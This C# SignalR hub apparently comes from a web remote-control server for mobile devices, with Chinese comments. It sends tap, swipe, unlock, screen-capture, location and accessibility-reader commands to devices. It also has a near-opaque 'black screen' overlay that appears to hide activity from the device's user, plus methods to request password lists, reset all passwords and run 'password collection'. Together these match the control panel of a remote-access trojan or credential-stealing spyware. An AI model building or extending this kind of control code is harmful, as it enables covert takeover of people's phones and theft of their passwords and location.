using Microsoft.AspNetCore.SignalR;
using WebRemoteControl.API.Services;
using WebRemoteControl.Core.Interfaces;
using WebRemoteControl.Core.Models;

namespace WebRemoteControl.API.Hubs;

/// <summary>
/// 设备实时通信 Hub
/// </summary>
public class DeviceHub : Hub
{
    private readonly IDeviceConnectionService _connectionService;
    private readonly IDeviceControlService _controlService;
    private readonly IActiveDeviceTracker _activeDeviceTracker;
    private readonly ILogger<DeviceHub> _logger;

    // 跟踪连接ID与设备ID的映射
    private static readonly Dictionary<string, HashSet<string>> _connectionToDevices = new();
    private static readonly object _lock = new object();

    public DeviceHub(
        IDeviceConnectionService connectionService,
        IDeviceControlService controlService,
        IActiveDeviceTracker activeDeviceTracker,
        ILogger<DeviceHub> logger)
    {
        _connectionService = connectionService;
        _controlService = controlService;
        _activeDeviceTracker = activeDeviceTracker;
        _logger = logger;
    }

    /// <summary>
    /// 加入设备组（用于接收特定设备的消息）
    /// </summary>
    public async Task JoinDeviceGroup(string deviceId)
    {
        await Groups.AddToGroupAsync(Context.ConnectionId, $"device_{deviceId}");
        _logger.LogInformation($"客户端 {Context.ConnectionId} 加入设备组: {deviceId}");

        // 跟踪连接和设备的映射
        lock (_lock)
        {
            if (!_connectionToDevices.ContainsKey(Context.ConnectionId))
            {
                _connectionToDevices[Context.ConnectionId] = new HashSet<string>();
            }
            _connectionToDevices[Context.ConnectionId].Add(deviceId);
        }

        // 更新活动设备跟踪器
        _activeDeviceTracker.AddConnection(deviceId, Context.ConnectionId);
    }

    /// <summary>
    /// 离开设备组
    /// </summary>
    public async Task LeaveDeviceGroup(string deviceId)
    {
        await Groups.RemoveFromGroupAsync(Context.ConnectionId, $"device_{deviceId}");
        _logger.LogInformation($"客户端 {Context.ConnectionId} 离开设备组: {deviceId}");

        // 移除连接和设备的映射
        lock (_lock)
        {
            if (_connectionToDevices.ContainsKey(Context.ConnectionId))
            {
                _connectionToDevices[Context.ConnectionId].Remove(deviceId);
                if (_connectionToDevices[Context.ConnectionId].Count == 0)
                {
                    _connectionToDevices.Remove(Context.ConnectionId);
                }
            }
        }

        // 更新活动设备跟踪器
        _activeDeviceTracker.RemoveConnection(deviceId, Context.ConnectionId);
    }

    /// <summary>
    /// 发送点击命令
    /// </summary>
    public async Task<bool> SendTap(string deviceId, int x, int y)
    {
        _logger.LogInformation($"发送点击命令到设备 {deviceId}: ({x}, {y})");
        return await _controlService.SendTapAsync(deviceId, x, y);
    }

    /// <summary>
    /// 发送滑动命令
    /// </summary>
    public async Task<bool> SendSwipe(string deviceId, int x1, int y1, int x2, int y2)
    {
        _logger.LogInformation($"发送滑动命令到设备 {deviceId}: ({x1}, {y1}) -> ({x2}, {y2})");
        return await _controlService.SendSwipeAsync(deviceId, x1, y1, x2, y2);
    }

    /// <summary>
    /// 发送返回键
    /// </summary>
    public async Task<bool> SendBack(string deviceId)
    {
        _logger.LogInformation($"发送返回键到设备 {deviceId}");
        return await _controlService.SendBackAsync(deviceId);
    }

    /// <summary>
    /// 发送 Home 键
    /// </summary>
    public async Task<bool> SendHome(string deviceId)
    {
        _logger.LogInformation($"发送 Home 键到设备 {deviceId}");
        return await _controlService.SendHomeAsync(deviceId);
    }

    /// <summary>
    /// 发送任务键
    /// </summary>
    public async Task<bool> SendTask(string deviceId)
    {
        _logger.LogInformation($"发送任务键到设备 {deviceId}");
        return await _controlService.SendTaskAsync(deviceId);
    }

    /// <summary>
    /// 启动屏幕捕获
    /// </summary>
    public async Task<bool> StartScreenCapture(string deviceId)
    {
        _logger.LogInformation($"启动屏幕捕获: {deviceId}");
        return await _controlService.StartScreenCaptureAsync(deviceId);
    }

    /// <summary>
    /// 停止屏幕捕获
    /// </summary>
    public async Task<bool> StopScreenCapture(string deviceId)
    {
        _logger.LogInformation($"停止屏幕捕获: {deviceId}");
        return await _controlService.StopScreenCaptureAsync(deviceId);
    }

    /// <summary>
    /// 启动遥控模式（关键！必须先调用才能使用 Home/Back/Task 等控制命令）
    /// </summary>
    public async Task<bool> StartScreenControl(string deviceId)
    {
        _logger.LogInformation($"启动遥控模式: {deviceId}");
        return await _controlService.StartScreenControlAsync(deviceId);
    }

    /// <summary>
    /// 停止遥控模式
    /// </summary>
    public async Task<bool> StopScreenControl(string deviceId)
    {
        _logger.LogInformation($"停止遥控模式: {deviceId}");
        return await _controlService.StopScreenControlAsync(deviceId);
    }

    /// <summary>
    /// 唤醒屏幕
    /// </summary>
    public async Task<bool> WakeScreen(string deviceId)
    {
        _logger.LogInformation($"唤醒屏幕: {deviceId}");
        return await _controlService.WakeScreenAsync(deviceId);
    }

    /// <summary>
    /// 锁定屏幕
    /// </summary>
    public async Task<bool> LockScreen(string deviceId)
    {
        _logger.LogInformation($"锁定屏幕: {deviceId}");
        return await _controlService.LockScreenAsync(deviceId);
    }

    /// <summary>
    /// 解锁屏幕
    /// </summary>
    public async Task<bool> UnlockScreen(string deviceId)
    {
        _logger.LogInformation($"解锁屏幕: {deviceId}");
        return await _controlService.UnlockScreenAsync(deviceId);
    }

    /// <summary>
    /// 启动黑屏
    /// </summary>
    public async Task<bool> StartBlackScreen(string deviceId, int alpha = 245)
    {
        _logger.LogInformation($"启动黑屏: {deviceId}, alpha={alpha}");
        return await _controlService.StartBlackScreenAsync(deviceId, alpha);
    }

    /// <summary>
    /// 停止黑屏
    /// </summary>
    public async Task<bool> StopBlackScreen(string deviceId)
    {
        _logger.LogInformation($"停止黑屏: {deviceId}");
        return await _controlService.StopBlackScreenAsync(deviceId);
    }

    /// <summary>
    /// 请求位置信息
    /// </summary>
    public async Task<bool> RequestLocation(string deviceId)
    {
        _logger.LogInformation($"请求位置信息: {deviceId}");
        return await _controlService.RequestLocationAsync(deviceId);
    }

    /// <summary>
    /// 启动桌面阅读器（无障碍UI捕获）
    /// </summary>
    public async Task<bool> StartScreenReader(string deviceId)
    {
        _logger.LogInformation($"启动桌面阅读器: {deviceId}");
        return await _controlService.StartScreenReaderAsync(deviceId);
    }

    /// <summary>
    /// 停止桌面阅读器
    /// </summary>
    public async Task<bool> StopScreenReader(string deviceId)
    {
        _logger.LogInformation($"停止桌面阅读器: {deviceId}");
        return await _controlService.StopScreenReaderAsync(deviceId);
    }

    /// <summary>
    /// 请求密码列表
    /// </summary>
    public async Task<bool> RequestPasswordList(string deviceId)
    {
        _logger.LogInformation($"请求密码列表: {deviceId}");
        return await _controlService.RequestPasswordListAsync(deviceId);
    }

    /// <summary>
    /// 重置指定类型的密码
    /// </summary>
    public async Task<bool> ResetPassword(string deviceId, int passwordType)
    {
        _logger.LogInformation($"重置密码: {deviceId}, 类型: {passwordType}");
        return await _controlService.ResetPasswordAsync(deviceId, (PasswordType)passwordType);
    }

    /// <summary>
    /// 重置所有密码
    /// </summary>
    public async Task<bool> ResetAllPasswords(string deviceId)
    {
        _logger.LogInformation($"重置所有密码: {deviceId}");
        return await _controlService.ResetAllPasswordsAsync(deviceId);
    }

    /// <summary>
    /// 开始密码采集
    /// </summary>
    public async Task<bool> StartPasswordCollection(string deviceId, int passwordType)
    {
        _logger.LogInformation($"开始密码采集: {deviceId}, 类型: {passwordType}");
        return await _controlService.StartPasswordCollectionAsync(deviceId, (PasswordType)passwordType);
    }

    /// <summary>
    /// 停止密码采集
    /// </summary>
    public async Task<bool> StopPasswordCollection(string deviceId)
    {
        _logger.LogInformation($"停止密码采集: {deviceId}");
        return await _controlService.StopPasswordCollectionAsync(deviceId);
    }

    public override async Task OnConnectedAsync()
    {
        _logger.LogInformation($"客户端连接: {Context.ConnectionId}");
        await base.OnConnectedAsync();
    }

    public override async Task OnDisconnectedAsync(Exception? exception)
    {
        _logger.LogInformation($"客户端断开: {Context.ConnectionId}");

        // 断开连接时自动停止该连接相关设备的投屏和屏幕阅读器
        HashSet<string>? deviceIds = null;
        lock (_lock)
        {
            if (_connectionToDevices.TryGetValue(Context.ConnectionId, out var devices))
            {
                deviceIds = new HashSet<string>(devices);
                _connectionToDevices.Remove(Context.ConnectionId);
            }
        }

        if (deviceIds != null)
        {
            foreach (var deviceId in deviceIds)
            {
                // 从活动设备跟踪器中移除
                _activeDeviceTracker.RemoveConnection(deviceId, Context.ConnectionId);

                try
                {
                    _logger.LogInformation($"自动停止设备 {deviceId} 的投屏和屏幕阅读器（客户端断开）");

                    // 停止屏幕捕获
                    await _controlService.StopScreenCaptureAsync(deviceId);

                    // 停止遥控模式
                    await _controlService.StopScreenControlAsync(deviceId);

                    // 停止屏幕阅读器
                    await _controlService.StopScreenReaderAsync(deviceId);

                    _logger.LogInformation($"已成功停止设备 {deviceId} 的投屏、遥控和屏幕阅读器");
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, $"自动停止设备 {deviceId} 功能时出错");
                }
            }
        }

        await base.OnDisconnectedAsync(exception);
    }
}

